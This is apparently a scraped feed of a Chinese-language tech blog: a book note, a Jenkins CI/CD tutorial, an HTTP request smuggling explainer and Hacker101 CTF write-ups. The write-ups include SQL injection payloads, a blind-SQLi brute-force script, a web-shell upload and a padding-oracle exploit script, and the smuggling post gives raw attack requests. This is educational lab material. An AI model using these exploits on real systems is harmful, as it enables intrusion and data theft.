溝通時，每個人都想證明自己是對的當你去批評和指責對方做得不夠的百分之十時他自然會觸發他自己的防衛機制，想進一切辦法像你呈現他做到的百分之九十於是爭吵就開始，但其實雙方都是對的，只是角度不同，焦點不一樣而已 當你觸發他的防衛機制時，他的心門也就關閉了當一個人心門關閉，要如何溝通呢? 所以要看見對方已經做得很好的地方，把對方放在對的位置讓他信任你，自然會願意接受你的建議無論是在溝通、談判、職場，還是與人相處都是一樣的 在這種狀況中，不仿試試書中提到的『位置感知法』 位置感知法一個人會陷入困境，通常是站在自己角度看問題所導致但不管一個人見識有多廣，總會有盲點所以要從不同位置、角度去看待同一個問題當你站在對方做的百分之九十的角度上，你會知道他其實也做了很多努力也就不會太過於批評導致對方的心門關上而無法溝通接下來就可以適當地給出建議，當你不全盤否地的同時，他也不會否定你的建議而是會朝著如何怎麼讓事情變得更好的方向 根據這個要點，書中在後面提出了對人不對事的看法因為事在人為，事情的對錯都是由人的標準與立場決定的不同人有不同標準與立場，就算同一個人站在不同立場，標準也不會一樣，對於對與錯的定義也就不同只針對事情的話，會忽略人的感受，就會讓事情沒辦法如願以償就像老鳥和菜鳥針對一件事情的遠見絕對不一樣老鳥經驗多了，自然知道有什麼該注意，但他不需要批評菜鳥沒注意到的點這樣只會讓菜鳥感到挫折後面會再寫寫關於這個看法的內容 後記這本書真的不錯，真心推薦書中很多例子，是可以在不同場景替換的，因為核心是沒有改變的因為例子還有超級多，所以會慢慢記錄下來","link":"/2020/03/23/%E5%88%A5%E4%BA%BA%E6%80%8E%E9%BA%BC%E5%B0%8D%E4%BD%A0,%E9%83%BD%E6%98%AF%E4%BD%A0%E6%95%99%E7%9A%84-part1/"},{"title":"Hacker 101 CTF Write Up Part 1 - Micro-CMS v2, TempImage","text":"近期想到 HackerOne 找找 Bug Bounty卻意外發現這邊有 CTF 可以玩玩，就順手玩了幾題然後做紀錄 Micro-CMS v2根據題目總共有 3 個 Flag 0x00一進來頁面長這樣 試著建立一個新的 Page, 發現要登入帳號密碼 看到帳號密碼就是要先下個單引號，結果就噴出 exception 了 根據 error 的 sqlcur.execute('SELECT password FROM admins WHERE username=\\'%s\\'' % request.form['username'].replace('%', '%%')可以推斷出他是透過 username select 出來後再用程式比對密碼有 SQL Injectiob 的話，就可以走 union all select 的套路username: 'union all select 1#password: 1 補充:union all select 可以組合前一個和後一個 SQL 結果假設 select username from admins where uername = 'admin' 會回傳 admin但如果是 select username from admins where uername = 'not_exists' 會回傳空的東西配合 union all select 的話select username from admins where uername = 'admin' union all select 1 會回傳 admin, 1 兩個值那如果是 select username from admins where uername = 'not_exists' union all select 1 只會回傳 1 登入成功後，可以看到有一個 Private Page 點進去後發現第一個 FLAG 0x01接下來嘗試新建立 Page 接下來就試著輸入 &lt;svg/onload=alert(document.cookie)，建立成功 發現好像也沒跳出什麼東西，嘗試去玩玩修改功能發現到第二次修改成功的時候會出現 Not Found URL，覺得有點疑惑 於是把 Payload 記下來拿到 Post Man 重新送送看，結果就拿到 FLAG 了 0x02這個漏洞找有點久，因為登入的時候，過幾秒會被導入到首頁，不會被停留在登入成功的頁面為了不讓 js 執行，所以改用 Post Man 去送，想看一下回來的 html 是什麼發現回來的 html 註解裡面有一個小提示 看起來是要往拿到真正的帳號密碼才會拿到 FLAG於是把資料丟到 sqlmap 就把資料 dump 出來的 登入成功後就拿到 FLAG 了 這邊用另一個不用 sqlmap 而是改用自己寫程式去做 (雖然 sqlmap 原理應該跟這個差不多)主要會用到 length(password) 和 length(username) 的方式先去判斷有幾個字元再透過 mysql _ 的匹配符號去做猜測，這個符號會去做一個比對假設字串是 username = abcde，username like ‘a____’ 就會比對成功，會回傳 true但如果是 username like ‘b____’ 就會比對失敗，會回傳 false接下來會利用這個特性去撰寫一個程式去找到完整的帳號密碼 假如說 length(password) = 5在 mysql 裡面可以這樣去寫 select username from admins where username = '' or password like '_____'然後在慢慢替換第一字 select username from admins where username = '' or password like 'a____' 去找到回傳 true 的狀況 先嘗試去找到密碼的長度，一般輸入結果如果為 false 會回傳 Uknown User 試著把 payload 改成 ' or 1=1# 發現回傳Invalid Password，代表說有找到使用者因為 false || true 的結果為 true，所以有成功從資料庫撈到資料 那是試著改成 ' or 1=221# 發現回傳 Uknown User 所以只要讓 username 那一段 sql 回傳 true，他就會把真正的密碼帶上來所以接下來可以試著用 ' or length(password)=1# 慢慢去比對看長度最後發現密碼長度為 8 接下來要構造出 like 的 payload 為 ' or password like binary '________'#如果上面成立的話，會回傳 Invalid Password 失敗的話則會回傳 Uknown User根據這兩個結果可以撰寫程式了，這邊會用 node.js 去做列舉這邊加上 binary 去強制去使用 CASE SENSITIVE 去做判別密碼為: marcelle 所以最後 username: ' or 1=1# password: marcelle登入後拿到 FLAG! 這邊附上程式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748const axios = require('axios');const qs = require('querystring');(async () =&gt; { let passwordLength = 8; let password = (() =&gt; { let counter = 0; let temp = ''; while (counter &lt; passwordLength) { temp += '_'; counter++; } return temp })(); let found = false let answer = ''; let position = 0; let allPosibile = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\" while (!found) { let tempPassword = password for (const char of allPosibile) { tempPassword = tempPassword.split(\"\"); tempPassword[position] = char; tempPassword = tempPassword.join(\"\") let payload = `' or password like binary '${tempPassword}'#` let result = await axios({ url: 'http://34.74.105.127/58b04db906/login', method: 'post', headers: { 'content-type': 'application/x-www-form-urlencoded' }, data: qs.stringify({ username: payload, password: '' }) }).then(response =&gt; response.data) if (result.includes('Invalid password')) { console.log(`${position}: ${char}`); answer += char; break; } } position++; if (position &gt;= passwordLength) { break; } } console.log(answer);})() TempImage根據題目總共有 2 個 Flag 0x00剛進來頁面是這樣 點進去 upload.php 的頁面，發現可以上傳檔案 順便開原始碼有哪些 input 發現有 file 以及 filename 可以做更動，這邊先試著上傳一張正常的圖片URL: http://34.74.105.127/020fb13cda/files/eb705c0e32ff0f15c9801f5d40fe290f_test-3.png看起來是把我上傳的檔名變成檔案名稱了，這邊就試著改 filename (這邊使用 burp suit 去改，順便方便等等可以改內容)把 filename 改成 test-3.html 結尾 發現成功改成 .html 且成功是內容URL: http://34.74.105.127/020fb13cda/files/807fb7eecbe831518d078107d8f0fedf_test-3.html 這邊嘗試加上 ../ 在 filenmame 上面，發現爆出 FLAG 了 0x01從上一個 FLAG 發現有一個 move_upload_file 裡面會帶一個 path 這邊試著符合這個 path 帶入 /../test-3.html 試試看 發現 URL 變成 http://34.74.105.127/020fb13cda/files/test-3.html往上跳了一層 … !?因為此 server 可以執行 php，於是改成 php 試試看順便在檔案內容之中多加一個 &lt;?php phpinfo(); ?&gt; 發現內容還是顯示圖片格式? 這邊試著把檔案內容全砍掉只留下 &lt;?php phpinfo(); ?&gt; 結果被判定成不是 PNG 不能上傳了 如果不是改檔案副檔名和 Content-Type 會影響格式判斷的話有可能是根據 PNG 的前幾個 bytes 去判斷，所以這邊只留下前面的 bytes 發現無法顯示 QQ，這邊不確定原因，試了非常久 後來想到在上傳到上一層不知道會怎樣，於是試試看 發現成功執行 PHP 檔案！！所以代表可能是 files 那一層有鎖不能顯示 php 檔案URL: http://34.74.105.127/020fb13cda/test-3.php 接下來上傳 web shell 去看看有什麼檔案 逛了一下，發現 index.php 有 FLAG 存在","link":"/2019/09/04/hacker101-part1/"},{"title":"CI/CD 實現 - bitbucket & Jenkins 篇","text":"前言試想一下，我們把專案 push 上去後接下來就是要進行本地測試測試完成後，把專案推上去，把 PR 發給相關人員通過後需要把大家的 branch 都合併然後我們就要把這個程式放到正式環境這一整個行為被稱為 CI/CD CI 就是上述提到的版控、程式碼分析、建置、自動化測試CD 就是把要 Release 的程式放到正式環境去，讓真正的使用者使用 雖然大家都狂說 CI/CD 是很屌很猛但其實工程師當久了版控、程式碼分析、建置、自動化測試、部署這一整套流程自然而然能夠自動化就自動化，才沒在管叫做 CI/CD (雖然有了這名詞溝通上很方便就是了XD而且每個公司的 CI/CD 流程都會根據架構服務有所變形 CI/CD 工具只是輔助，重點是整套流程要出來才對根據不同流程，會有不同的 CI/CD 工具可以應用應該先釐清公司的服務和架構該如何做到 CI/CD 再來去想用哪些工具假如說公司都已經全都 container 化，那用 drone 或許是一個不錯的選擇又或是現階段架構不大，可以採用人工介入的半自動 CI/CD 來減少全自動化的成本等等在這推薦筆者覺得觀念寫得不錯的文章架構師觀點: 你需要什麼樣的 CI / CD ? 這篇文章主要是記錄筆者有在使用 CI/CD 流程的一部分筆記 流程圖大致上流程如下 本地端把程式 push 到 bitbucket bitbucket 接收到 push 的通知後，把此消息告訴 jenkins server jenkins 收到從 bitbucket 來的消息後，開始把程式 pull 下來 jenkins pull 成功後，開始執行 test 成功執行完 test 後，執行部署 部署成功後發送通知給 slack 流程圖如下，但第 5 個步驟的部署並不會有實際例子這會在後記部分進行說明 準備以下四點要事前準備 jenkins 可以使用 docker 安裝的，這樣就不會污染到本機環境了 專案是需要用到 npm，所以必須進到 jenkins 裡面安裝 node.js 專案則是使用 bibucket，所以需要自己準備好 bitbucket repository 此篇是使用『Slack App』去做發布訊息，所以需要一個 Slack App 的 Oath Token 去做認證可以參考筆者之前的文章去建立 Slack App jenkins 安裝透過此指令 docker run -it -p 8080:8080 -u root jenkins/jenkins:lts安裝 jenkins 最新版，並以 root 的角色登到 container 裡面接下來用 root 的使用者安裝 node.js12curl -sL https://deb.nodesource.com/setup_12.x | bash -apt-get install -y nodejs 接下來用瀏覽器開啟 http://localhost:8080 去把 jenkins 給初始化進到頁面首先會要求你輸入初始密碼使用以下指令把密碼取得，並複製上去即可完成cat /var/jenkins_home/secrets/initialAdminPassword後面就是新增一個 admin 帳號和密碼就不截圖說明了 bitbucket 專案準備一個 node.js 專案，透過 npm init 去初始化然後在 package.json 的 scripts 裡面添加一行 test 指令然後把此專案的 bitbucet 連結準備好123\"scripts\": { \"test\": \"echo 'Start CI/CD!'\"} 取得 Slack App Oath Access Token請到 https://api.slack.com/apps 點選要使用的 Slack App 去取得 Oath Access Token 這邊需要此權限『chat:write:bot』 jenkins &amp; bitbucket 串接jenkins 設定首先進到 jenkins 的管理頁面，這裡以 http://localhost:8080 為主首先為了要 bibucket 任何 push, merge 動作能夠在 jenkins 這邊去識別以下的條件『當 jenkins 設定當 bibucket [push/merge/…等等] master 會建置，其餘 branch 不會建置』就先必須安裝 bitbucket plugins 去做這件事情，不安裝的話 jenkins 無法識別 bitbucket 的通知點選左邊『管理 jenkins』，然後點選『管理外掛程式』，把 bitbucket 先安裝好除此之外要做到 slack 通知，也把『Slack Notification』此外掛裝好 回到 jenkins 首頁按下左上角『新增作業』，選擇 free style 往下滑到原始碼管理，選擇 git把剛剛準備好的 bitbucket 連結貼上去然後應該會出現下列的錯誤訊息，代表需要帳號密碼才可以存取此 repository 點選圖中的 add 去新增使用者帳號密碼 輸入成功後，會跳回去剛剛的畫面，輸入正確的話就不會出現錯誤訊息 下圖的 branch 設定意義是指當 bitbucket master 有變更的時候，會觸發此建置但要注意，此設定要搭配 bitbucket plugin 合用才會有效喔 接下來往下滾動會看到『建置觸發程序』，勾選圖中那兩樣，並保留排程空白 再往下把看到建置，請點選『新增建置步驟』&gt;『新增 shell』 輸入以下 shell12cd $WORKSPACE # 移動到專案的目錄npm run test # 執行 test 指令 接下來為了要把建置的結果通知給相關人員請點選『新增建置後動作』&gt;『Slack Notification』 這邊先勾選成功會通知即可 接下來會看到各個要輸入資訊的地方，先把除了 Credential 以外的填完 此 Credential 必須要用到剛剛得到的 Oath Access Token這裡點選 add，進去後類型選擇『Secret Text』，並把 Token 填入 這邊補充一下如果不想要每一個專案都設定一次可以回到 jenkins 首頁，點選裡面的設定可以設定全域，這樣所有專案就可以吃同一個設定就不需要讓每一個專案都設定 oath channel 等等的東西了但基本的設定還是要設置，像是在『建置成功』『建置失敗』的情境下要發送通知這種如果不設定的話，訊息是不會發送到 slack 的 接下來按下右下角 Test Connection成功的話就會在 slack 上面看到 jenkins 的訊息了最後按下儲存 接下來要設定能夠讓 bitbucket 呼叫到我們 jenkins 的 api在此之前我們需要先建立 api token點選『使用者』&gt;『點選剛建立的 admin』即可取得 api token 『按下 Add new token』，馬賽克那一串就是 api token 了 Bitbucket 設定到 bitbucket 的專案設定裡面，點選 webhook 把此 url 設定進去http://[jenkins 帳號]:[jenkins api token]@[jenkins url]:[jenkins port]/git/notifyCommit?url=[bitbucket branch]如果 jenkins 帳號是 admin，api token 是 12345然後 jenkins url 是 ngrok or public ip，這邊以 1.1.1.1 為範例port 是 8080，branch 是 https://user@bitbucket.org/user/ci-cd-test.git全部綜合起來，連接應該要如下http://admin:12345@1.1.1.1:8080/git/notifyCommit?url=https://user@bitbucket.org/user/ci-cd-test.git 如果沒有自己 server 的人可以用 Ngrok - Connect to your localhost! 讓 bitbucket 連線到你的 jenkins server 建立完成後，點選『View Request』就可以看有沒有 branch 被推上來 實作結果接下來到專案內，隨意修改並進行 push，就會看到下面有列出 request 進來 在 jenkins 上面就會看到有建置開始在運行了左下角出現 #6 就是正在建置的號碼 點選進去後，可以看到 commit 的 log 點選『Console Output』，最下面可以看到剛剛專案的 Start CI/CD 就出現了 Slack 裡面也會出現建置成功的通知 後記這樣就算是打通 CI/CD 粗略流程了實際上 CI 還要包含跑測試以及跑程式掃描而 CD 還要有部署到伺服器以 CD 來說可以利用 ssh root@1.1.1.1 &quot;echo 1&quot; 直接執行遠端伺服器的指令去連到另一台伺服器去跑已經撰寫好了 deploy shell或是有的使用 k8s 去做部署又或是你家的 production server 就直接放在 jenkins server 上 XD這些東西都是要根據每個公司不同的伺服器架構去決定要如何去撰寫這裡就不詳細介紹該如何去實作了","link":"/2020/02/17/ci-cd-jenkins/"},{"title":"Hacker 101 CTF Write Up Part 6 - Encrypted Pastebin (Padding Oracle 以及翻轉攻擊)","text":"Encrypted Pastebin這題總共有四個 flag 0x00一開始畫面長這樣 試著輸入值之後，發現上面有一段 ?post= 資料 嘗試更改之後，發現 flag 0x01根據上一個 error message 得知有用到 base64所以可以知道 ?post= 的是 base64接下來再輸入一些奇怪的值試試看 發現程式使用的是 aes-128-cbc 去把資料作加密且根據錯誤訊息表示 IV 要為 16 bytes，代表 post 是需要帶入 IV 進去的那根據這篇解釋 aes 加解密以及存在的 padding oracle 攻擊得知透過修改 iv 可以對解密後的資料做 XOR，進而達到目標 payload主要公式如下:12345678// new_iv 為攻擊者構造的 iv// iv 為原本的 iv// plain 為明文// middle 代表透過 aes 解密後，但還未經過 xor 的時候的 payload公式 1: plain[i] = middle[i] XOR iv[i]公式 2: 0x01 = middle[i] XOR new_iv[i]公式 3: middle[i] = 0x01 XOR new_iv[i]公式 4: plain[i]= 0x01 XOR new_iv[i] XOR iv[i]透過以上公式可以推斷出明文，這邊用 16bytes 去排版，方便後續說明123456789{&quot;flag&quot;: &quot;^FLAG^a38f2d9e2659df7212c341bc01a2cf828c7d663978eb476ac6d664a03f49c08c$FLAG$&quot;, &quot;id&quot;: &quot;3&quot;, &quot;key&quot;: &quot;rTU2s8qRJ4uRRdLFJbt-YA~~&quot;}\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n 0x02因為上一題有發現 id 為 3於是開始繼續利用上一個 flag 提到的文章裡面的翻轉攻擊去修改解密後的明文123456789// new_iv 為攻擊者構造的 iv// iv 為原本的 iv// plain 為明文// middle 代表透過 aes 解密後，但還未經過 xor 的時候的 payload// 'x' 為我們想要把解密後的值透過 xor 後變成的結果公式 1: plain[i] = middle[i] XOR iv[i]公式 2: 'x' = middle[i] XOR new_iv[i]公式 3: 'x' XOR new_iv[i] XOR iv[i] = plain[i]公式 4: new_iv[i] = plain[i] XOR 'x' XOR iv[i] 透過上面公式可以去修改原本的 payload這裡我們先只拿第一段來做修改，先省略掉其他 payload123456原本 iv: 05694ed4efacf438e310a4fc54ff2826原本明文: {&quot;flag&quot;: &quot;^FLAG^預期明文: {&quot;id&quot;: &quot;1&quot;}\\x05\\x05\\x05\\x05\\x05 (記得不夠是要 padding value)原本的值: 05694ed4efacf438e310a4fc54ff28265a813ad8376339531ea70324a0ce85c8更改後的: 056941dcacf1f620f21087bf1dbb6a7d5a813ad8376339531ea70324a0ce85c8上面可以發現前面 32 bytes 的 iv 已經變了把這個 payload 塞回去得到下面得結果 果然 QQ，原本以為還是要有 key 才能去解開，不能只單純改 id因為原本 id 在第 7 個 block所以改了第 6 個的 block，讓 id 所在的 block 從 3 -&gt; 1但改了第 6 個的 block，解密出來一定會有問題所以要先知道改了第 6 個 block 後的明文，再去回推第 5 個 block 應該要什麼值才能讓更改後的第 6 個 block XOR 後才能解回原本應有的值以此類推，要更改到最面的 iv block 才算完成但全部改完之後出現下面訊息，看來跟上面直接改 id 是一樣的\b看來 key 是拿去做進一層解密內容使用，所以直接改 id 不需要 key 就可以了，有點白做了 XD 0x03這一題試著把 id 改成單引號發生一件事情SQL Injection 出現了, 所以就需要把 payload 改成 SQL Injection 用的至於為什麼要用 SQL Injection 的原因是因為前一個 flag 只有顯示 title，但內容因為 key 問題所以沒有顯示出來所以只能透過 SQL Injection 去 dump 出資料庫看看有什麼可以幫助解開前一個 flag 的內容大概是長下面的樣子，透過替換掉前面的 FLAG 達到更換 id 以及保留 key 的值123456789{&quot;id&quot;: &quot;9 union all select database(),user()&quot;, &quot;aa&quot;: &quot;xxxxxxxxxxc6d664a03f49c08c$FLAG$&quot;, &quot;bb&quot;: &quot;3&quot;, &quot;key&quot;: &quot;rTU2s8qRJ4uRRdLFJbt-YA~~&quot;} 這樣就 dump 出 database 的資訊了(level3 以及 root@localhost 那個) 再來 dump 出 tables dump 出 columns 透過 dump 出來的 tables 和 columns，去把 tracking 列出資料來 發現有一筆資料是對 localhost 運行的結果把 post= 後面的值帶到瀏覽器後發現 flag4 (黑色大標是 flag3，下面小字為內容才是 flag4) 下面整理當時寫出來的 SQL Injection 搭配 Padding Oracle 程式碼 (有點亂 XD)程式基本邏輯為下: 透過 padding oracle 找到原本明文 透過翻轉攻擊構造假 iv 達到預期目標的明文 解完最右邊那一個 block 後，繼續慢慢往左邊一次解一個 block 解下去 要注意的地方是最外層的 for 迴圈一定要從第 9 個往下遞減跑下去每次跑完如果 request 量太多的導致中斷連線的話會顯示下一個要解的 block，以及下一個 payload 應該帶什麼，去防止中斷因為這邊是直接一次 call 256 的 request 去找比較快，所以很容易斷 XD最後面要注意的是 wantedPlainText 一定要是 16 bytes 唯一組才可以 想要直接使用這個程式碼的直接改兩個大點即可 originalPayload 的那一段 base64 改成正常 request 的 base64 把 http://34.74.105.127/548dbda597/?post= 改成你自己的即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596const getPayload = (paddingOracleValue, paddingValue, answer) =&gt; { answer.reverse() answer[paddingOracleValue] = paddingValue answer.reverse() return answer.toString('hex')}const setBlock = (allBlocks, targetBlock, paddingOracleValue, paddingValue, answer) =&gt; { const startPosition = targetBlock * 32; const previousBlockEndPosition = startPosition - 32; let first = allBlocks.substring(0, previousBlockEndPosition); let end = allBlocks.substring(startPosition); return first + getPayload(paddingOracleValue, paddingValue, answer) + end;}const encodeHexToBase64 = (payload) =&gt; { return Buffer.from(payload, 'hex').toString('base64').replace(/\\=/g, '~').replace(/\\//g, \"!\").replace(/\\+/g, \"-\")}const decodeBase64ToHex = (payload) =&gt; { return Buffer.from(payload.replace(/\\~/g, '=').replace(/\\!/g, \"/\").replace(/\\-/g, \"+\"), 'base64').toString('hex')}(async () =&gt; { const axios = require('axios'); // original let originalPayload = decodeBase64ToHex(\"H6KJsPhBWKtdEt3LZnTuf8K5!-B69-TxsTNIze9!0Wrss6wGzNUKwi-aaz8WfDVnBrb2UsO7tuAhRej9F05Fexm6MihRiLDQO1vNGPdAgGZAWo11!Mw1tAdnhvdOZra3gJ99qA1adxSD!s97jVbcizRIXZ!MHVKw4jVNAplCiqzYtXJNNhxCXsJIPRKDptSLgukPWBN!wEY2e1nCQPYVrQ~~\"); for (let i = 3; i &gt; 0; i--) { let block = i let plain = [] let plainText = []; let rawPayload = originalPayload.substring(0, (block + 1) * 32) let previousIv = originalPayload.substring((block - 1) * 32, (block) * 32) let answer = Buffer.from(\"00000000000000000000000000000000\", 'hex'); for (let paddingOracleValue = 0; paddingOracleValue &lt; 16; paddingOracleValue++) { let job = [] for (let index = 0; index &lt; 256; index++) { let paddingValue = index; let blocksToBeDecrypt = setBlock(rawPayload, block, paddingOracleValue, paddingValue, answer) payload = encodeHexToBase64(blocksToBeDecrypt) job.push(axios.get(`http://34.74.105.127/548dbda597/?post=${payload}`)) } let results = await Promise.all(job).catch((error) =&gt; { console.log(error) }) for (let index = 0; index &lt; results.length; index++) { let paddingValue = index; if (!results[index].data.includes('PaddingException')) { let originalIv = Buffer.from(rawPayload, 'hex') let tempPlainText = paddingValue ^ (paddingOracleValue + 1); plainText.push(tempPlainText); plain.unshift(Buffer.from([tempPlainText ^ originalIv[(block) * 16 - 1 - paddingOracleValue]]).toString('hex')) answer.reverse() let nextPaddingOracleValue = (paddingOracleValue + 2); for (let index = 0; index &lt; plainText.length; index++) { answer[index] = plainText[index] ^ nextPaddingOracleValue; } answer.reverse() console.log(plain); break; } } } const wantedPlainText = [ '{\"id\": \"9 union ', 'all select group', '_concat(headers)', ' ,2 FROM trackin', 'g\", \"b\": \"bbbbbb', 'bbbbbbbbbbbbbbbb', 'bbbbbbbbbbbbbbbb', 'bbb\", \"bbbbbb\":\"', 'YA~~\"}\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n' ] const originalIv = Buffer.from(previousIv, 'hex') const change = plain.map(item =&gt; parseInt(item, 16)) console.log('old: ' + Buffer.from(change).toString()); console.log('new: ' + wantedPlainText[block - 1]); const originPlainText = Buffer.from(change) const wanttedPlainText = Buffer.from(wantedPlainText[block - 1]) const wanttedIv = [] for (let index = 0; index &lt; wanttedPlainText.length; index++) { wanttedIv.push(originalIv[index] ^ originPlainText[index] ^ wanttedPlainText[index]) } let newIv = Buffer.from(wanttedIv).toString('hex') let part1 = originalPayload.substring(0, (block - 1) * 32); let part3 = originalPayload.substring((block) * 32); originalPayload = `${part1}${newIv}${part3}` console.log(`replaced block: ${block}`); console.log(`next block: ${block - 1}`); console.log(`new payload: ${encodeHexToBase64(originalPayload)}`); } axios.get(`http://34.74.105.127/548dbda597/?post=${encodeHexToBase64(originalPayload)}`).then((response) =&gt; { console.log(response.data) })})(); 後記這題花了我很多時間解決 XD本來想說最後的 SQL Injection 就不要解了，反正大概知道怎麼弄但還是很想把它解出來，所以就還是想辦法透過程式自動化去找到最後的 flag只是過程中一直修改 wantedPlainText 再加上還會一直斷線真的是有夠麻煩 XD","link":"/2019/10/20/hacker101-part6/"},{"title":"HTTP Request Smuggling (HTTP 請求走私)","text":"什麼是 HTTP Request Smuggling ?今日常見的網頁應用程式往往會有多一層 server 的存在請求 –&gt; front-end server –&gt; back-end serverfront-end server 接收到請求的時候，會轉發到 back-end server 去處理 http request smuglling 的漏洞就是出現在『轉發』到 back-end server 這裏有時候為了效能關係，front-end server 到 back-end server 這一段會把所有請求塞在同一段 TCP Connection 裡面 (重複利用 TCP Connection)，如下圖 當所有請求集中在一起轉發到 back-end server 時如果在這之中有不合法的請求的話，會出現什麼樣的狀況呢？此不合法的請求會被當成『下一個』請求被 back-end server 處理這就是 HTTP Request Smuggling 攻擊 HTTP Request Smuggling 原理主要是透過 Content-Length 以及 Transfer-Encoding 此兩個標頭可以去構造出此攻擊，這邊複習一下這兩個標頭的意義 Content-LengthContent-Length 指的就是用 POST Method 時帶入的 data 的長度以此範例來說，總共為 11 bytes，那 Content-Length 就是 11(此長度不含 \\r\\n\\r\\n，詳細 HTTP 組成可參考此 HTTP/1.1 — 訊息格式 Message Format) 123456POST /search HTTP/1.1Host: xxxxxxxxContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling Transfer-EncodingTransfer-Encoding 是為了解決上一個標頭 Content-Length 的問題而出現的另一個計算 message body 的方式詳細可以參考 HTTP 协议中的 Transfer-Encoding 這邊總共分為三個主體 1. 內容長度 (16 進位) 2. 主要內容 3. 結束 以下面的例子來說 1. 內容長度為: b 2. 內容為: q=smuggling 3. 結束: 0 第二點的內容是不包含 \\r\\n 的除非請求本身不是 POST，需要直接結束的話則需要把 \\r\\n 帶進去，且要計算長度 12345678POST /search HTTP/1.1Host: xxxxxxxxContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0 而 HTTP 為了預防此兩個標頭同時使用所以當這兩個標頭同時出現的時候，會忽略 Content-Length 這個標頭再加上 front-end 和 back-end server 處理此兩個標頭的方式可能不一樣 代表說當以下情況出現時front-end 支援 Content-Length 但不支援 Transfer-Encodingback-end 支援 Content-Length 支援 Transfer-Encoding如果我同時送了兩個標頭過去的話，front-end 就只會處理 Content-Length 格式的內容而 back-end 就只會處理 Transfer-Encoding 格式的內容造成不一致的現象，這造成 HTTP Request Smuggling 漏洞的問題原因之一 反過來說front-end 支援 Content-Length 支援 Transfer-Encodingback-end 支援 Content-Length 但不支援 Transfer-Encoding也會造成不一致的現象，也是問題原因之一 上面兩個例子各代表為 CL.TE vulnerabilities 以及 TE.CL vulnerabilitiesCL = Content-LengthTE = Transfer-Encoding順序代表了 front-end.back-end，簡單來說就是看誰支援什麼 構造 HTTP Request SmugglingCL.TE基本請求的概念如下12345678POST / HTTP/1.1Host: xxxxxxxxContent-Length: 13Transfer-Encoding: chunked0SMUGGLED 因為前端支援 CL，所以就先用 CL 把要偷渡的請求先放在最下面並且用一個 0 放在前面代表著 TE 的結束符號當請求到 back-end 的時候POST 到 0 那一段就會是一個 reuqestSMUGGLED 那一段就會是下一個 request 這邊根據參考資料的網站去做一下實驗因為題目說要構造出 GPOST 到 back-end 處理 先試著對 front-end server 做 GPOST 得到此回應 接下來就是要把 GPOST 偷渡在 request 裡面送到 back-endPayload 為下:1234567891011POST / HTTP/1.1Host: xxxxxxxxContent-Length: 29Transfer-Encoding: chunked0GPOST /test HTTP/1.1---- 不包含此行 記得要有 \\r\\n 插在中間才代表 request 的結束不然會出現 timeout 或是 invalid request 的問題而在最後面的 GPOST 需要兩個 \\r\\n這樣的 Content-Length 計算是需要包含 \\r\\n\\r 一個 byte\\n 一個 byte 所以從 0 開始那一段0\\r\\n -&gt; 3 bytes\\r\\n -&gt; 2 byteGPOST /test HTTP/1.1\\r\\n -&gt; 22 bytes\\r\\n -&gt; 2 bytes總計為 29 bytes 第一次送 request 會得到正常的請求 第二次送，因為前一次 request 走私了一個 request所以 response 會回應到此次 request 上就得到 Unreconize GPOST Method 了 TE.CL基本請求的概念如下1234567891011POST / HTTP/1.1Host: xxxxxxxxContent-Length: 3Transfer-Encoding: chunked8SMUGGLED0---- 不包含此行 因為前端支援 TE，所以就先用 TE 把要偷渡的請求先放在最中間再微調 CL 的長度，讓 back-end 只處理到 TE 的第一個主體，這邊要注意是 CL 的設置，長度要設置到 TE 的第一個主體結尾 (包含 \\r\\n)以上面的例子來說，CL 長度要填到 8\\r\\n 為止 (3 bytes)後面就放要走私的請求即可 這邊根據參考資料的網站去做一下實驗第一個要注意的點是要偷渡的 request 長度GPOST /test HTTP/1.1\\r\\n -&gt; 22 bytes\\r\\n -&gt; 2 bytes24 bytes 轉成 16 進位變成 16 第二個要注意的點是 CL 長度為 416\\r\\n -&gt; 4 bytes 12345678910111213POST / HTTP/1.1Host: xxxxxxxxContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked16GPOST /test HTTP/1.10---- 不包含此行 第一次送 request 會得到正常的請求 第二次送，因為前一次 request 走私了一個 request所以 response 會回應到此次 request 上就得到 Unreconize GPOST Method 了 TE.TE還有一種是利用 front-end 和 back-end 對 TE 不同的解析方式去攻擊透過帶入讓 server 混淆的 TE，可以藉此讓 server 不去解析 TE而改去解析 CL 舉例來說帶入 Transfer-Encoding: cowfront-end server 如果把它判別成錯誤的標題，此時會轉去判斷 CL這樣攻擊就是 CL.TE 攻擊了 反過來是 back-end server 解析錯誤，改轉去判斷 CL 的話那就是 TE.CL 攻擊了 根據網站去做攻擊實驗此實驗是 TE.CL 攻擊，代表 back-end server 針對 TE 解析有誤 123456789101112POST / HTTP/1.1Host: ac1b1fd31f891d6c80bb2c930035000c.web-security-academy.netContent-Length: 4Transfer-Encoding: chunkedTransfer-Encoding: cow16GPOST /test HTTP/1.10--- 不包含此行 byte 算法跟前面的 TE.CL 一樣 如果此漏洞是 front-end server 針對 TE 有解析問題的話Payload 和算法就要改成 CL.TE 的方式了 第一次送 request 會得到正常的請求 第二次送，因為前一次 request 走私了一個 request所以 response 會回應到此次 request 上就得到 Unreconize GPOST Method 了 後記上面簡單的根據自己理解的意思去說明了一下如何使用 HTTP Request Smuggling 攻擊其他更詳細的可以參考下面資料，都有提供 lab 去做攻擊而且官方寫的都非常詳細，非常建議去看看和玩玩看 lab 參考資料 What is HTTP request smuggling Finding HTTP Request Smuggling Exploiting HTTP Request Smuggling HTTP Desync Attacks: Request Smuggling Reborn 此文章是作者如何繞過 PayPal 登入機制所寫的","link":"/2019/09/30/http-smuggling/"},{"title":"Java Executor、TheadPoolExecutor 設定參數基本介紹","text":"前言Thread Pool 的概念和使用 Database 的 Connection Pool 是很類似的概念就像 Connection Pool 的使用方法是去 Pool 裡面取得一個 Connection 使用使用完之後就關閉此 Connection，並把這個 Connection 丟回 Pool 之中讓其他程式使用 Thread Pool 也是這種概念，但在 JDK 1.5 之前的版本中是沒有一個管控的方式幾乎都是用 new Thread 的方式去創建使用在 JDK 1.5 之後的版本則是出了 Exectuor 去管控 Thread Pool ThreadPoolExecutor 介紹Java 提供了 ThreadPoolExecutor 